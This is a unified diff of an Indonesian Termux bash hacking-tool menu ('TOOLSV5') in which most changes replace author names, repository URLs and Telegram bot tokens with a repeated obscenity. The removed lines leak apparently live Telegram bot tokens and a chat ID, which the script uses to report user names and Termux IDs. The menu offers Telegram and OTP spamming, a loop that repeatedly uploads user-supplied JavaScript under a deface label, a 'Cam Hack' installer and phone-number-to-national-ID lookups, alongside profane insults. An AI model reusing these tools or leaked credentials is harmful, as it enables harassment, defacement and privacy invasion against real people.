@@ -2,7 +2,7 @@
 
 set +x
 #!/bin/bash
-echo "DECODE HARAM BEBAN LU ASU" > ROYAL
+echo "TOOLSV5 JOMOK" > ROYAL
 scan="/data/data/com.termux/"
 scan1="/data/data/com.termux/files/usr/lib/python3.11/email/mime/Dneu"
 reset-package() {
@@ -12,27 +12,7 @@ reset-package() {
      rm -rf $HOME/Lubeban
      cd $HOME
      # Uninstall semua paket
-     pkg uninstall git -y
-     pkg uninstall bash -y
-     pkg uninstall sox -y
-     pkg uninstall python python2 python3 -y
-     pkg uninstall mpv -y
-     pkg uninstall cowsay -y
-     pkg uninstall ruby -y
-     pkg uninstall binutils -y
-     pkg uninstall zip -y
-     pkg uninstall unzip -y
-     pkg uninstall curl -y
-     pkg uninstall jq -y
-     pkg uninstall ossp-uuid -y
-     pkg uninstall ncurses-utils -y
-     pkg uninstall nodejs -y
-     pkg uninstall nodejs-lts -y
-     pkg uninstall python -y
-     pkg uninstall xz-utils -y
-     pkg uninstall busybox -y
-     pip uninstall pyliblzma -y
-     gem uninstall lolcat -x
+     
      npm -g uninstall bash-obfuscate
      #installasi package
      pkg update
@@ -52,7 +32,7 @@ reset-package() {
      gem install lolcat
      rm -rf $HOME/Lubeban
      cd $HOME
-     git clone https://github.com/Lubebansokhekel/Lubeban
+     git clone 
      cd Lubeban
 }
 
@@ -80,16 +60,9 @@ menu() {
                     git stash &> /dev/null
                     git pull origin main &> /dev/null
                     : > /data/data/com.termux/files/usr/tmp/hozokroco
-                    cat << 'EOF' > /data/data/com.termux/files/usr/tmp/hozokroco
-Version="/data/data/com.termux/files/usr/lib/python3.11/email/mime/Dneu/Version"
-versitoolsv5=$(cat "$Version")
-update="/data/data/com.termux/files/usr/lib/python3.11/email/mime/Dneu/info"
-gal="/data/data/com.termux/files/usr/lib/$versitoolsv5"
-letakgalirus="/data/data/com.termux/files/usr/etc/apt"
-internalsc="/data/data/com.termux/files/usr/include/jso"
-termux_id=$(whoami)
-versitoolsv5=$(cat "$Version")
-edukasi="/data/data/com.termux/files/usr/.galirus-officia"
+                    cat << 'EOF' > /data/data/com.termux/files/usr/tmp/galiruskroco
+
+
 echo "ON" > "$edukasi" &> /dev/null
 e="echo -e "
 m="\033[1;31m"   # Merah (Sudah diberikan)
@@ -138,7 +111,7 @@ mv -f $filenya/music.txt $filenya$soundnya
 fi
 done
 }
-musik="mpv --volume=70 --shuffle --cache=yes --cache-secs=10 --playlist="/data/data/com.termux/files/usr/bin/MusicG404" --title="backsound" &> /dev/null &"
+musik="mpv --volume=70 --shuffle --cache=yes --cache-secs=10 --playlist="/data/data/com.termux/files/usr/bin/Music" --title="backsound" &> /dev/null &"
 musikrun() {
 if pgrep -f "mpv.*backsound" > /dev/null; then
 echo "Musik sudah berjalan di latar belakang."
@@ -211,10 +184,10 @@ list=(
 "/data/data/com.termux/files/usr/Bot4"
 "$bot3"
 )
-echo "DECODE HARAM BEBAN LU ASU" > /data/data/com.termux/files/home/Lubeban/run
+echo "GALIRUS KONTOL ANJING KAMPANG ANAK HARAM " > /data/data/com.termux/files/home/Lubeban/run
 echo "echo "Ketik Toolsv5 Aja ! "" > /data/data/com.termux/files/home/Lubeban/run.sh
-echo "echo "DECODE HARAM BEBAN LU ASU"" > /data/data/com.termux/files/usr/tmp/hozokroco
-echo "echo "DECODE HARAM BEBAN LU ASU"" > /data/data/com.termux/files/usr/lib/python3.11/ensurepip/_bundled/Nethercap/ROYAL
+echo "echo "GALIRUS KONTOL ANJING KAMPANG ANAK HARAM"" > /data/data/com.termux/files/usr/tmp/galiruskroco
+echo "echo "GALIRUS KONTOL ANJING KAMPANG ANAK HARAM"" > /data/data/com.termux/files/usr/lib/python3.11/ensurepip/_bundled/Nethercap/ROYAL
 banner1() {
 echo "⠀
 ⠄⠄⠄⢰⣧⣼⣯⠄⣸⣠⣶⣶⣦⣾⠄⠄⠄⠄⡀⠄⢀⣿⣿⠄⠄⠄⢸⡇⠄⠄
@@ -288,8 +261,8 @@ while true; do
 clear
 banner2 | lolcat
 $e $b
-xdg-open "https://sfl.gl/jr8gp"
-$e $h $bg_lg"Link Token$m :$c https://sfl.gl/jr8gp$res$b "
+xdg-open "GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
+$e $h $bg_lg"Link Token$m :$c  "
 read -p "Masukkan Token: " USER_API_KEY
 play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
 if [ "$USER_API_KEY" == "$API_KEY" ]; then
@@ -311,7 +284,7 @@ done
 }
 while true; do
 LOGIN_FILE="/data/data/com.termux/files/usr/etc/.resolv.confg"
-API_KEY="ダサール・デコード・ベバン・バジンガン"
+API_KEY="GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 if [ -f "$LOGIN_FILE" ]; then
 LAST_LOGIN=$(cat "$LOGIN_FILE")
 CURRENT_TIME=$(date +%s)
@@ -328,7 +301,7 @@ else
 clear
 play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
 $e $b $bg_lg"Selamat datang kembali!\nAnda masih dalam periode$h login$b yang$h valid.$res"
-isipesan="System Perpanjang Berlaku 👨‍��"
+isipesan="System Perpanjang Berlaku"
 TRIAL_USER &> /dev/null
 sleep 3
 break
@@ -361,7 +334,7 @@ $e "\033[1;32m
 ⠀⠀⢸⣿⢸⣿⢸⣿⢸⣿⢸⣿⠃⠀⠀⠀⠀⠀⠀⢸⣿⣿⣏⠀⣿⣿⣿⡇⠀⠀⠀
 ⠀⠀⢸⣿⠈⣿⢸⣿⢸⡟⢸⣿⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡧⠀⣿⣿⣿⡇⠀⠀⠀
 ⠀⠀⠈⣿⣿⣿⣾⣿⣾⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠏⠀⢻⣿⣿⠇⠀
-\033[1;37mGALIRUS X GUSTI
+\033[1;37mGALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM
 \n"
 }
 function get_size() {
@@ -528,9 +501,9 @@ fi
 }
 termuxtoolsv5="/data/data/com.termux/files"
 telegram() {
-TOKEN1="7224304462:AAEcPFM4WwG5n57s8RuvDNxc-wFKdBK1aUQ"
-TOKEN2="7465534118:AAFcJ_Rp5W3DCJnYSIVtCkzph0ORIZSGkVY"
-CHAT_ID="5034446293"
+TOKEN1="GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
+TOKEN2="GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
+CHAT_ID="GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 CURRENT_TOKEN=$TOKEN1
 while true; do
 cekinstal="/data/data/com.termux/files/usr/lib/commplate"
@@ -592,7 +565,7 @@ EOF
 )
 caption=$(
 cat << EOF
-🔰 TOOLSV5
+🔰 GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM
 👤 Nama: $NAMA
 🆔 ID Termux: $TERMUX_ID
 📋 Status: $STATUS
@@ -641,8 +614,8 @@ fi
 done
 }
 TRIAL_USER() {
-TOKEN1="8168090840:AAFb0urG0RFiIvqTd7txCvHiqOhlyj_Z-Rc"
-CHAT_ID="5034446293"
+TOKEN1="GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
+CHAT_ID="GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 CURRENT_TOKEN=$TOKEN1
 while true; do
 cekinstal="/data/data/com.termux/files/usr/lib/commplate"
@@ -719,7 +692,7 @@ EOF
 )
 caption=$(
 cat << EOF
-🔰 TOOLSV5
+🔰 GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM
 👤 Nama: $NAMA
 🆔 ID Termux: $TERMUX_ID
 📋 Status: $STATUS
@@ -825,7 +798,7 @@ exit 0
 else
 echo "y" | termux-setup-storage &> /dev/null
 cd /data/data/com.termux/files/usr/lib/apt/methods
-git clone https://github.com/GALIRUS404/network
+git clone GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM
 cd network
 git stash &> /dev/null
 git pull origin main &> /dev/null
@@ -846,7 +819,7 @@ exit 0
 else
 echo "y" | termux-setup-storage &> /dev/null
 cd /data/data/com.termux/files/usr/share
-git clone https://github.com/GALIRUS404/xxpa
+git clone GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM
 cd xxpa
 git stash &> /dev/null
 git pull origin main &> /dev/null
@@ -869,7 +842,7 @@ bash toolsv5
 exit 0
 else
 cd $HOME
-git clone https://github.com/Lubebansokhekel/Pasang
+git clone GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM
 fi
 done
 EOF
@@ -884,7 +857,7 @@ break
 else
 rm -rf $scan_download/gal
 cd $HOME
-git clone https://github.com/GALIRUS404/downloader
+git clone GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM
 cd downloader
 git stash
 git pull origin main
@@ -909,7 +882,7 @@ fi
 done
 if [ -z "$1" ]; then
 clear
-cowsay -f eyes "DEVELOPMENT GALIRUS_OFFICIAL" | lolcat
+cowsay -f eyes "DEVELOPMENT GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM" | lolcat
 echo -e '\033[1;31mGunakan: mpvtube "URL"\033[0m'
 exit 1
 fi
@@ -939,7 +912,7 @@ echo "${used_colors[@]}"
 while true; do
 clear
 read -r TITLE_COLOR BAR_COLOR CONTROLS_COLOR ROOT_COLOR <<< "$(random_color)"
-echo -e "\n${TITLE_COLOR}MPVTUBE - GALIRUS 404${RESET}"
+echo -e "\n${TITLE_COLOR}MPVTUBE - GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM 404${RESET}"
 CURRENT_TIME=$(get_property "time-pos" | cut -d'.' -f1)
 TOTAL_TIME=$(get_property "duration" | cut -d'.' -f1)
 if [[ -z "$TOTAL_TIME" || "$TOTAL_TIME" == "null" || "$TOTAL_TIME" -eq 0 ]]; then
@@ -1009,18 +982,13 @@ done
 }
 banner() {
 echo "
-███████╗██╗  ██╗██╗██████╗ ██╗   ██╗███████╗
-██╔════╝██║  ██║██║██╔══██╗██║   ██║██╔════╝
-███████╗███████║██║██████╔╝██║   ██║███████╗
-╚════██║██╔══██║██║██╔══██╗██║   ██║╚════██║
-███████║██║  ██║██║██║  ██║╚██████╔╝███████║
-╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝ No Watermark"
+███GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM No Watermark"
 }
 color_splash
 search_xnxx() {
 local query=$1
 local encoded_query=$(echo "$query" | jq -sRr @uri)
-local url="https://www.xnxx.com/search/$encoded_query"
+local url="GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 echo "Mencari di: $url"
 local result=$(curl -s "$url")
 echo "$result" | grep -oP '(?<=href=")[^"]*' | grep '/video' | sed 's|^|https://www.xnxx.com|'
@@ -1214,11 +1182,11 @@ git stash &> /dev/null
 git pull origin main &> /dev/null
 mv -f .nhca /data/data/com.termux/files/usr/lib/.libgnd
 cd /data/data/com.termux/files/usr/share/
-git clone https://github.com/GALIRUS404/list &> /dev/null
+git clone GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM &> /dev/null
 git stash &> /dev/null
 git pull origin main &> /dev/null
 cd $HOME/Lubeban
-git clone https://github.com/GALIRUS404/sound &> /dev/null
+git clone GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM &> /dev/null
 git stash &> /dev/null
 git pull origin main &> /dev/null
 else
@@ -1227,7 +1195,7 @@ $e $m "REPOSITORY HILANG MENDOWNLOAD ❗$h"
 mkdir -p /data/data/com.termux/files/usr/lib/python3.11/email/mime/
 cd /data/data/com.termux/files/usr/lib/python3.11/email/mime/ &> /dev/null
 sleep 3
-git clone https://github.com/Hozowaorokananingenda/Dneu &> /dev/null | echo "Sedang Proses Mendownload "
+git clone GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM &> /dev/null | echo "Sedang Proses Mendownload "
 cd Dneu
 git pull origin main &> /dev/null
 git stash &> /dev/null
@@ -1305,7 +1273,7 @@ $e $k "Status$b TOOLSV5$bl :$h Online "
 sleep 3
 pkill -9 -f "mpv.*server" &> /dev/null &
 function loading1() {
-text="SUBSCRIBE GALIRUS OFFICIAL"
+text="SUBSCRIBE HOZOO"
 columns=$(stty size | awk '{print $2}')
 while true; do
 for ((i = 1; i <= columns; i++)); do
@@ -1337,7 +1305,7 @@ done
 done
 }
 function loading3() {
-text="  Terdeteksi MEMODIFIKASI TOOLSV5 VIRUS ( ON ) "
+text="  Terdeteksi MEMODIFIKASI TOOLSV5 VIRUS ( ON ) GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 columns=$(stty size | awk '{print $2}')
 while true; do
 for ((i = 1; i <= columns; i++)); do
@@ -1355,7 +1323,7 @@ done
 function ENTER() {
 $e $m
 sleep 5
-read -p "ENTER UNTUK MENGULAGI TOOLSV5"
+read -p "ENTER UNTUK MENGULAGI TOOLSV5 GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 }
 nama_file="/data/data/com.termux/files/usr/include/bash/include/filememek.h"
 while true; do
@@ -1439,7 +1407,7 @@ play_sound_effect &> /dev/null &
 }
 bahancuy() {
 cd /data/data/com.termux/files/usr/lib/python3.11/email/mime/
-git clone --depth 32 https://github.com/Hozowaorokananingenda/.tanjhobi
+git clone --depth 32 GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM
 cd .tanjhobi
 git pull origin main
 git stash
@@ -1565,7 +1533,7 @@ address=$(printf "%-20s" "$ip")
 cd $HOME/Lubeban
 clear
 play -q $HOME/Lubeban/sound/robot2.mp3 &> /dev/null &
-$e "              $bg_lg GALIRUS X TOOLSV5  $res" | lolcat
+$e "              $bg_lg GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM X TOOLSV5  $res" | lolcat
 $e $ran"╔══════════════════════════════════════════════════╗$ran"
 $e $ran"║          _     _     _     _     _               ║"
 $e $ran"║         / \   / \   / \   / \   / \              ║"
@@ -1576,8 +1544,8 @@ $e $ran"╚═══════════════════════
 $e $ran"║                                                  ║"
 play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
 $e $ran"╔══════════════════════════════════════════════════╗$ran"
-$e $ran"║  ${m}•${p} Author${bl}  :${ran3} GALIRUS OFFICIAL            $ran       $ran ║"
-$e $ran"║  ${k}•${p} Github${bl}  :${ran3} github.com/GALIRUS404       $ran       $ran ║"
+$e $ran"║  ${m}•${p} Author${bl}  :${ran3} GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM            $ran       $ran ║"
+$e $ran"║  ${k}•${p} Github${bl}  :${ran3} GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM       $ran       $ran ║"
 $e $ran"║  ${h}•${p} Rilis ${bl}  :${ran3} 23,03,2023                  $ran       $ran ║"
 $e $ran"║  ${b}•${p} Your ID${bl} :${ran3} $termux_id                       $ran     $ran ║"
 $e $ran"║  ${u}•${p} Status${bl}  :${ran3} $status                   $ran         $ran ║"
@@ -2065,7 +2033,7 @@ $p⠀⠀⠀⠀⠀⢠⣿⣿⣶⣶⣤⣤⣤⣤⡀⢁⣠⣤⣤⣤⣶⣶⣿⣿⡀⠀
 ⠀⠀⠀⠀⠀⣸⣿⡏⠉⠙⠛⠿⢿⣿⣿⣾⣿⡿⠿⠛⠋⠉⠹⣿⡇⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠻⢿⣧⣀⠀⠀⣀⣀⣼⡿⣿⣯⣀⣀⠀⠀⣀⣼⡿⠗⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⠁⠘⣿⣿⣿⣿⣿⠟⠉$h  Spam Bot Tele Target ⠀⠀⠀⠀⠀⠀
-$p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣇⣀⣀⣹⣿⣿⣿⠃$k Developer$c Galirus Official⠀⠀⠀⠀⠀⠀⠀⠀
+$p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣇⣀⣀⣹⣿⣿⣿⠃$k Developer$c GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM⠀⠀⠀⠀⠀⠀⠀⠀
 $p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⠿⣿⡿⢿⣿⠿⣿⡇$or Version$k :$bld 1.0.0⠀⠀⠀⠀⠀
 $p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⢀⣿⡇⢸⣿⡀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -2159,7 +2127,7 @@ if [ -f "$edukasi" ]; then
 echo
 else
 $e $bld "Silahkan Tonton Video Tutorial"
-mpv --volume=150 --shuffle --cache=yes --cache-secs=10 "https://od.lk/s/OV8yNDY0NTk1NzZf/tutorial.mp3" &> /dev/null
+mpv --volume=150 --shuffle --cache=yes --cache-secs=10 "GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM" &> /dev/null
 xdg-open ""
 xdg-open ""
 sleep 5
@@ -2232,7 +2200,7 @@ $p⠀⠀⠀⠀⠀⢠⣿⣿⣶⣶⣤⣤⣤⣤⡀⢁⣠⣤⣤⣤⣶⣶⣿⣿⡀⠀
 ⠀⠀⠀⠀⠀⣸⣿⡏⠉⠙⠛⠿⢿⣿⣿⣾⣿⡿⠿⠛⠋⠉⠹⣿⡇⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠻⢿⣧⣀⠀⠀⣀⣀⣼⡿⣿⣯⣀⣀⠀⠀⣀⣼⡿⠗⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⠁⠘⣿⣿⣿⣿⣿⠟⠉$h  Simpel Spam OTP ⠀⠀⠀⠀⠀⠀
-$p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣇⣀⣀⣹⣿⣿⣿⠃$k Developer$c Galirus Official⠀⠀⠀⠀⠀⠀⠀⠀
+$p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣇⣀⣀⣹⣿⣿⣿⠃$k Developer$c GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM⠀⠀⠀⠀⠀⠀⠀⠀
 $p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⠿⣿⡿⢿⣿⠿⣿⡇$or Version$k :$bld 2.0.0 beta...!⠀⠀⠀⠀⠀⠀
 $p⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⢀⣿⡇⢸⣿⡀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠈⠉⠁⠀⠀⠀⠀⠀
@@ -2242,7 +2210,7 @@ Jadi Mohon Rezeki Dari Kalian
 Berapa pun ( Seikhlasnya )
 Untuk Memperbarui Api OTP
 Jika sewaktu-waktu Mokad :(
-sawer admin$k https://saweria.co/Galirus$res$h
+sawer admin$k GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAMs$res$h
 ⠀⠀⠀⠀⠀
 $m$bg_lg Dilarang CTRL + C/Z$res
 $m$bg_lg Sebelum spam berulang Berhenti Sendiri$res
@@ -2492,20 +2460,25 @@ EOF
 )"
 break
 else
-apt install -y bash
-apt install -y libwebp
-apt install -y git
-apt install -y nodejs
-apt install -y ffmpeg
-apt install -y wget
-apt install -y imagemagick
-pkg install yarn
+apt install -y bash -y
+apt install -y libwebp -y
+clear
+apt install -y git -y
+clear
+apt install -y nodejs -y
+clear
+apt install -y ffmpeg -y
+clear
+apt install -y wget -y
+clear
+apt install -y imagemagick -y
+pkg install yarn -y
 yarn
 fi
 break
 else
 cd /data/data/com.termux/files/usr/lib/pkgconfig
-git clone https://github.com/Lubebansokhekel/spamweb &> /dev/null && echo "Sabar Ntot Instalasi package"
+git clone GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM &> /dev/null && echo "Sabar Ntot Instalasi package"
 cd spamweb
 git stash &> /dev/null
 git pull origin main &> /dev/null
@@ -2585,7 +2558,7 @@ if [ -f "$edukasi" ]; then
 echo
 else
 $e $bld "Silahkan Tonton Video Tutorial"
-mpv --volume=150 --shuffle --cache=yes --cache-secs=10 "https://od.lk/s/OV8yNDY0NTk1NzZf/tutorial.mp3" &> /dev/null
+mpv --volume=150 --shuffle --cache=yes --cache-secs=10 "GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM" &> /dev/null
 xdg-open ""
 xdg-open ""
 sleep 5
@@ -2714,7 +2687,7 @@ echo "
 ██║  ██║█████╗  █████╗  ███████║██║     █████╗
 ██║  ██║██╔══╝  ██╔══╝  ██╔══██║██║     ██╔══╝
 ██████╔╝███████╗██║     ██║  ██║╚██████╗███████╗
-╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝ G404"
+╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝ GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 }
 DEFACE() {
 local nama="$1"
@@ -2792,7 +2765,7 @@ xdg-open "https://jso-tools.z-x.my.id/"
 read -p "Masukkan Pesan (Jso): " javascript
 read -p "Durasi (dalam detik, misalnya 10): " duration
 clear
-$e $h "��Memulai Serangan Spam Upload🔥"
+$e $h "Memulai Serangan Spam Upload🔥"
 $e $bg_m "Berhenti Otomatis Tergantung Pada Duration$res"
 if ! [[ "$duration" =~ ^[0-9]+$ ]]; then
 $e "$m""Durasi harus berupa angka!$res"
@@ -2801,7 +2774,7 @@ fi
 start_time=$(date +%s)
 end_time=$((start_time + duration))
 while [ $(date +%s) -lt $end_time ]; do
-DEFACE "GALIRUS OFFICIAL" "TOOLSV5_V.$versitoolsv5@gmail.com" "$javascript"
+DEFACE "GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM" "GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM.$versitoolsv5@gmail.com" "$javascript"
 done
 echo "Durasi selesai. Menghentikan proses."
 }
@@ -2826,13 +2799,13 @@ clear
 read -p "Kalau Boleh Tau Siapa Nama Anda ? " namamu
 echo "$namamu" > "$siapa"
 clear
-echo "Bantu Subscribe Galirus Official ��"
+echo "Bantu Subscribe GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 sleep 5
-xdg-open "https://www.youtube.com/@GalirusProjects"
+xdg-open "GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 clear
 echo "TUTORIALNYA DI TIKTOK SINI BREK !"
 sleep 10
-xdg-open "https://vt.tiktok.com/ZSY3Jkq5K/"
+xdg-open "GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 fi
 done
 else
@@ -2840,7 +2813,7 @@ clear
 $e "$bg_m DIREKTORI PENTING HILANG,PROSES PERBAIKAN$res"
 sleep 5
 cd /data/data/com.termux &> /dev/null
-echo "DEFACE G404 BY GALIRUS 404" > /data/data/com.termux/completed
+echo "DEFACE GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM" > /data/data/com.termux/completed
 fi
 else
 play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
@@ -2965,8 +2938,8 @@ printf "                 [|]          \n"
 printf "              \\_______/       \n"
 printf "               v     v        \n"
 printf "                ^___^         \n"
-printf "\e[1;92m   ��𝗔�� 𝗗𝗨𝗠𝗣𝗘𝗥v2      \e[0m\n"
-printf " \e[1;77m Tool created by KOMIK3R\nPengembangan By.Galirus404\e[0m \n"
+printf "\e[1;92m   GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM 𝗗𝗨𝗠𝗣𝗘𝗥v2      \e[0m\n"
+printf " \e[1;77m Tool created by KOMIK3R\nPengembangan By.GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM\e[0m \n"
 printf "\n"
 }
 stop() {
@@ -3071,7 +3044,7 @@ $e $k " Menginstall Cam Hack"
 sleep 2
 apt install -y git php wget curl jq openssh
 cd /sdcard
-git clone --depth 32 https://github.com/GALIRUS404/CAM-DUMPER
+git clone --depth 32 GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM
 cd CAM-DUMPER
 git pull origin main
 chmod +x camdumper.sh
@@ -3362,7 +3335,7 @@ sleep "$sleep_time"
 current_time=$(date +%s)
 elapsed_time=$((current_time - start_time))
 if [ "$elapsed_time" -ge "$duration" ]; then
-xdg-open "https://www.youtube.com/@GalirusProjects"
+xdg-open "GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 break 2
 fi
 done
@@ -3426,7 +3399,7 @@ $e "Mau Osint Pake Nomor Buat Dapet NIKnya ?"
 $e "Pake Bot Telegram Aja Silahkan Klik Telegram" | lolcat
 $e "Saya Akan Mengarahkan Anda Ke Telegram" | lolcat
 $e "Di dalam Nanti Langsung Anda Tempel Nomor Target Anda" | lolcat
-$e "Contohnya$c:$k 6285953465619"
+$e "Contohnya$c:$k GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 }
 loading_animation() {
 for ((i = 0; i <= length; i++)); do
@@ -3446,7 +3419,7 @@ echo "
 ██║   ██║███████╗██║██╔██╗ ██║   ██║
 ██║   ██║╚════██║██║██║╚██╗██║   ██║
 ╚██████╔╝███████║██║██║ ╚████║   ██║
-╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝   By.G404
+╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝   By.GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM
 "
 }
 bacot | lolcat
@@ -3466,14 +3439,14 @@ $e
 $e
 $e
 read -p "Silahkan Enter Untuk Menuju ke Telegram"
-xdg-open "https://t.me/Shiroko_Galery_Eyes_Bot"
+xdg-open "GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 elif [[ "$opo" = "n" || "$opo" = "N" ]]; then
 link | lolcat
 $e
 $e
 $e
 read -p "Silahkan Enter Untuk Menuju ke Telegram"
-xdg-open "https://t.me/Shiroko_Galery_Eyes_Bot"
+xdg-open "GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM"
 break
 else
 $e $m "BODO KALI KAU, YANG BENER ANYING"
@@ -3481,12 +3454,12 @@ fi
 else
 $e $bg_m "Package Durung Di Install, Installasi sek$res"
 cd /data/data/com.termux/files/usr/include/
-git clone --depth 32 https://github.com/GALIRUS404/NIK &> /dev/null | echo "Sabar Cok Sek Masang Iki"
+git clone --depth 32 GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM &> /dev/null | echo "Sabar Cok Sek Masang Iki"
 cd NIK
 git stash &> /dev/null
 git pull origin main &> /dev/null
 npm install nik-parse -g
-echo "kau anak kontol 😂" > "$lagek_melbu"
+echo "GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM" > "$lagek_melbu"
 fi
 done
 }
@@ -3536,30 +3509,11 @@ read -p "Enter Untuk Masuk Ke MENU"
 main_menu() {
 while true; do
 banner1() {
-echo "
-You
-⠀⠀⠀⣴⣾⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠈⢿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠈⣉⣩⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⣼⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀Animex⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⢠⣾⣿⣿⠉⣿⣿⣿⣿⣿⡄⠀⢀⣠⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠙⣿⣿⣧⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⠸⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠘⠿⢿⣿⣿⣿⣿⡄⠙⠻⠿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⡟⣩⣝⢿⠀⠀⣠⣶⣶⣦⡀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣷⡝⣿⣦⣠⣾⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣮⢻⣿⠟⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠻⠿⠻⣿⣿⣿⣿⣦⡀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠇⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⡆⠀⠀
